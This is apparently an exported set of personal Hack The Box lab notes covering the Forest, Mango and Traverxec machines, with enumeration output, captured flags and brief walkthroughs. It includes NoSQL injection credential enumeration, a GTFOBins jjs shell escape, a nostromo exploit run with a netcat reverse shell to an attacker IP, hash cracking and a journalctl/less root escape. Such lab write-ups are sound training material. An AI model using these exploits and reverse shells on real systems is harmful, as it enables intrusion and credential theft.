/><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.161    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.161    |<br /> ============================================ <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />Looking up status of 10.10.10.161<br />No reply from 10.10.10.161<br /><br /> ===================================== <br />|    Session Check on 10.10.10.161    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />[+] Server 10.10.10.161 allows sessions using username &#39;&#39;, password &#39;&#39;<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.161    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Domain Name: HTB<br />Domain Sid: S-1-5-21-3072663084-364016917-1341370565<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ====================================== <br />|    OS information on 10.10.10.161    |<br /> ====================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.161 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />[+] Got OS info for 10.10.10.161 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.161    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)<br />index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain<br />index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)<br />index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.<br />index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain<br />index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)<br />index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)<br />index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)<br />index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)<br />index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)<br />index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)<br />index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)<br />index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)<br />index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)<br />index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)<br />index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)<br />index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account<br />index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)<br />index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)<br />index: 0x2377 RID: 0x1db6 acb: 0x00000010 Account: omar	Name: (null)	Desc: (null)<br />index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)<br />index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)<br />index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)<br />index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)<br />index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)<br />index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)<br />index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)<br />index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)<br />index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)<br />index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)<br />index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)<br />index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br />user:[Administrator] rid:[0x1f4]<br />user:[Guest] rid:[0x1f5]<br />user:[krbtgt] rid:[0x1f6]<br />user:[DefaultAccount] rid:[0x1f7]<br />user:[$331000-VK4ADACQNUCA] rid:[0x463]<br />user:[SM_2c8eef0a09b545acb] rid:[0x464]<br />user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]<br />user:[SM_75a538d3025e4db9a] rid:[0x466]<br />user:[SM_681f53d4942840e18] rid:[0x467]<br />user:[SM_1b41c9286325456bb] rid:[0x468]<br />user:[SM_9b69f1b9d2cc45549] rid:[0x469]<br />user:[SM_7c96b981967141ebb] rid:[0x46a]<br />user:[SM_c75ee099d0a64c91b] rid:[0x46b]<br />user:[SM_1ffab36a2f5f479cb] rid:[0x46c]<br />user:[HealthMailboxc3d7722] rid:[0x46e]<br />user:[HealthMailboxfc9daad] rid:[0x46f]<br />user:[HealthMailboxc0a90c9] rid:[0x470]<br />user:[HealthMailbox670628e] rid:[0x471]<br />user:[HealthMailbox968e74d] rid:[0x472]<br />user:[HealthMailbox6ded678] rid:[0x473]<br />user:[HealthMailbox83d6781] rid:[0x474]<br />user:[HealthMailboxfd87238] rid:[0x475]<br />user:[HealthMailboxb01ac64] rid:[0x476]<br />user:[HealthMailbox7108a4e] rid:[0x477]<br />user:[HealthMailbox0659cc1] rid:[0x478]<br />user:[sebastien] rid:[0x479]<br />user:[lucinda] rid:[0x47a]<br />user:[svc-alfresco] rid:[0x47b]<br />user:[andy] rid:[0x47e]<br />user:[mark] rid:[0x47f]<br />user:[santi] rid:[0x480]<br />user:[omar] rid:[0x1db6]<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.161    |<br /> ========================================= <br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.161<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.161    |<br /> ==================================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br /><br />[+] Attaching to 10.10.10.161 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.10.10.161)<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] HTB<br />	[+] Builtin<br /><br />[+] Password Info for Domain: HTB<br /><br />	[+] Minimum password length: 7<br />	[+] Password history length: 24<br />	[+] Maximum password age: 41 days 23 hours 53 minutes <br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: 1 day 4 minutes <br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 7<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.161    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />group:[Account Operators] rid:[0x224]<br />group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]<br />group:[Incoming Forest Trust Builders] rid:[0x22d]<br />group:[Windows Authorization Access Group] rid:[0x230]<br />group:[Terminal Server License Servers] rid:[0x231]<br />group:[Administrators] rid:[0x220]<br />group:[Users] rid:[0x221]<br />group:[Guests] rid:[0x222]<br />group:[Print Operators] rid:[0x226]<br />group:[Backup Operators] rid:[0x227]<br />group:[Replicator] rid:[0x228]<br />group:[Remote Desktop Users] rid:[0x22b]<br />group:[Network Configuration Operators] rid:[0x22c]<br />group:[Performance Monitor Users] rid:[0x22e]<br />group:[Performance Log Users] rid:[0x22f]<br />group:[Distributed COM Users] rid:[0x232]<br />group:[IIS_IUSRS] rid:[0x238]<br />group:[Cryptographic Operators] rid:[0x239]<br />group:[Event Log Readers] rid:[0x23d]<br />group:[Certificate Service DCOM Access] rid:[0x23e]<br />group:[RDS Remote Access Servers] rid:[0x23f]<br />group:[RDS Endpoint Servers] rid:[0x240]<br />group:[RDS Management Servers] rid:[0x241]<br />group:[Hyper-V Administrators] rid:[0x242]<br />group:[Access Control Assistance Operators] rid:[0x243]<br />group:[Remote Management Users] rid:[0x244]<br />group:[System Managed Accounts Group] rid:[0x245]<br />group:[Storage Replica Administrators] rid:[0x246]<br />group:[Server Operators] rid:[0x225]<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Account Operators&#39; (RID: 548) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;System Managed Accounts Group&#39; (RID: 581) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Administrators&#39; (RID: 544) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Hyper-V Administrators&#39; (RID: 578) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Event Log Readers&#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br />Group &#39;Backup Operators&#39; (RID: 551) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br /><br />[+] Getting local groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================= <br />|    Users on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.161    |<br /> ============================================= <br />Could not initialise spoolss. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br /><br /><br />enum4linux complete on Thu Apr  2 12:02:31 2020<br /></div><div class='page'><h1 class='title level-7'>nmap smb</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.161<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 12:12 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.50s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED<br /><br />Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Forest$ <br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />e5e4e47ae7022664cda6eb013fb0d9ed<br />root<br />f048153f202bbb2f82622b04d79129cc</div><div class='page'><h1 class='title level-4'>10.10.10.162 Mango</h1><br/>nmap showed that 80, 443, and 22 were open<br />version nmap showed that 443&#39;s ssl certificate was for staging-order.mango.htb<br />I added that and mango.htb to the hosts file<br /><br />##cheated to see that nosql was running (although I could have guessed)<br />This github project got me the usernams and passwords I needed.<br /><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git</a><br /><br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login,submit:submit<br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login,submit:submit<br /><br />usernames<br />admin<br />mango<br /><br />Passwords<br />t9KcS3&gt;!0B#2<br />h3mXK8RhU~f{]f5H<br /><br />Logging in to the webpage didn&#39;t work, but ssh did!<br />mango@mango.htb:h3mXK8RhU~f{]f5H<br /><br />su -l admin<br />t9KcS3&gt;!0B#2<br />user.txt!!<br /><br />find / -perm -4000 2&gt;/dev/null | xargs ls -lah <br />^Showed me that I could run /usr/lib/jvm/java-11-openjdk-amd64/bin/jss as root! and it was in gtfo bins!<br /><br />cd into /usr/lib/jvm/java-11-openjdk-amd64/bin/<br />run ./jss<br /><br />throw the gtfo magic in there<br />echo &#39;var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);<br />var FileReader = Java.type(&quot;java.io.FileReader&quot;);<br />var br = new BufferedReader(new FileReader(&quot;file_to_read&quot;));                &lt;replace file_to_read with /root/root.txt<br />while ((line = br.readLine()) != null) { print(line); }&#39; | jjs<br /><br />root.txt shits to screen!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>usernames:<br />MrR3boot<br /><br /><br />probably ubuntu 18.04 Bionic (OpenSSH version)<br /><br />connect to maliciuos csv in :443 analytics.php<br /><br /><br /><a href="http://staging-order.mango.htb/">http://staging-order.mango.htb/</a><br /><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git</a><br /><br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login,submit:submit<br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login,submit:submit<br /><br />usernames<br />admin<br />mango<br /><br />Passwords<br />t9KcS3&gt;!0B#2<br />h3mXK8RhU~f{]f5H<br /><br />ssh mango@mango.htb<br /><br />su -l admin<br /><br />/usr/lib/jvm/java-11-openjdk-amd64/bin/<br />echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | ./jjs<br /><br /><br /><br /><br />echo &#39;var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);<br />var FileReader = Java.type(&quot;java.io.FileReader&quot;);<br />var br = new BufferedReader(new FileReader(&quot;file_to_read&quot;));<br />while ((line = br.readLine()) != null) { print(line); }&#39; | jjs<br /><br /><br />var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);<br />var FileReader = Java.type(&quot;java.io.FileReader&quot;);<br />var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));<br />while ((line = br.readLine()) != null) { print(line); }<br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.162 &amp;&amp; nmap -sC -sV -Pn 10.10.10.162 &amp;&amp; nmap -p- -Pn 10.10.10.162<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-15 18:17 EDT<br />Nmap scan report for 10.10.10.162<br />Host is up (0.28s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />443/tcp open  https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 41.18 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-15 18:18 EDT<br />Nmap scan report for 10.10.10.162<br />Host is up (0.27s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE  VERSION<br />22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)<br />|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)<br />|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)<br />80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: 403 Forbidden<br />443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Mango | Search Base<br />| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN<br />| Not valid before: 2019-09-27T14:21:19<br />|_Not valid after:  2020-09-26T14:21:19<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|_  http/1.1<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 67.79 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-15 18:19 EDT<br />Nmap scan report for 10.10.10.162<br />Host is up (0.21s latency).<br />Not shown: 65532 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />443/tcp open  https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1655.89 seconds<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/></div><div class='page'><h1 class='title level-8'>nmap</h1><br/>Scanned at 2020-04-15 18:23:19 EDT for 9s<br /><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /><br /></div><div class='page'><h1 class='title level-8'>nikto</h1><br/></div><div class='page'><h1 class='title level-7'>443</h1><br/></div><div class='page'><h1 class='title level-8'>nmap</h1><br/>PORT    STATE SERVICE  REASON  VERSION<br />443/tcp open  ssl/http syn-ack Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /><br /></div><div class='page'><h1 class='title level-8'>nikto</h1><br/></div><div class='page'><h1 class='title level-8'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />79bf31c6c6eb38a8567832f7f8b47e92<br />root<br />8a8ef79a7a2fbb01ea81688424e9ab15</div><div class='page'><h1 class='title level-4'>10.10.10.165 Traverxec</h1><br/>Nmap showed that port 80 and 22 were open.<br />dirsearch on port 80 showed the directory /%20.php<br />That dir showed that webserver nostromo 1.9.6 was running.<br /><a href="https://www.exploit-db.com/raw/47837">https://www.exploit-db.com/raw/47837</a> is an exploit for nostromo 1.9.6 that lets me run commands<br />nc one-liner and listerner gives me a reverse shell as www-data!<br /><br />the /var/nostromo/conf/.htpasswd showed me<br />david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/<br />hashcat hash finder showed me that it was a -m 500 (md5crypt)<br />hashcat showed me the corresponding password was Nowonly4me<br /><br />/var/nostromo/conf/nhttpd.conf showed me that the dir /home/david/public_www existed<br />in this dir was  backup-ssh-identity-files.tgz<br />copy to /dev/shm<br />unzip with tar<br />dump id_rsa to screen!<br />copy id_rsa to kali<br />ssh2john &gt; id_rsa.john<br />use john to crack the id_rsa hash, got the passcode hunter<br />chmod 600 id_rsa<br />ssh -i id_rsa david@10.10.10.165<br />hunter<br />we are david!!<br /><br />in david dir there is a script that shows us we can run sudo journalctl <br />journalctl has a vulnerability that dumbs you into less if the screen is realllllllllllllly tiny<br />make screen small<br />run the proscribed journalctl command<br />we are in less!!<br />!/bin/bash<br />whoami<br />    root!!<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="https://www.exploit-db.com/raw/47837">https://www.exploit-db.com/raw/47837</a><br />python 47837.py 10.10.10.165 80 &quot;nc -e /bin/sh 10.10.14.60 3232&quot;<br /><br />www-data@traverxec:/var/nostromo/conf$ cat .htpasswd <br />david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/<br /><br />Nowonly4me<br /><br /><br /><br /><br /><br /><br />root@kali:~/Desktop/Machines/HTB/Traverxec/dry# john id_rsa_john.pub <br />Using default input encoding: UTF-8<br />Loaded 1 password hash (SSH [RSA/DSA 32/32])<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />hunter           (id_rsa.pub)<br />1g 0:00:00:00 DONE 2/3 (2020-01-27 09:33) 33.33g/s 742566p/s 742566c/s 742566C/s hunter<br />Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />Session completed<br /></div><div class='page'><h1 class='title level-6'>nmap short</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.165<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-16 11:29 EST<br />Nmap scan report for 10.10.10.165<br />Host is up (0.10s latency).<br />Not shown: 998 filtered ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap large</h1><br/>nmap -sC -sV -p- 10.10.10.165<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-16 11:30 EST<br />Nmap scan report for 10.10.10.165<br />Host is up (0.099s latency).<br />Not shown: 65533 filtered ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)<br />|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)<br />|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)<br />80/tcp open  http    nostromo 1.9.6<br />|_http-server-header: nostromo 1.9.6<br />|_http-title: TRAVERXEC<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1977.45 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.165:80">http://10.10.10.165:80</a> --simple-report dirsearchsimple_10.10.10.165:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-20-01-16_11-31-10.log<br /><br />Target: <a href="http://10.10.10.165:80">http://10.10.10.165:80</a><br /><br />[11:31:10] Starting: <br />[11:31:11] 200 -    3KB - /img/<br />[11:31:11] 200 -  736B  - /icons/<br />[11:31:16] 200 -  602B  - /css/<br />[11:31:18] 200 -    1KB - /lib/<br />[11:31:20] 200 -  596B  - /js/<br />[11:31:51] 501 -  310B  - /%20.php<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.10.10.165:80">http://10.10.10.165:80</a> | tee nikto_10.10.10.165:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.165<br />+ Target Hostname:    10.10.10.165<br />+ Target Port:        80<br />+ Start Time:         2020-01-16 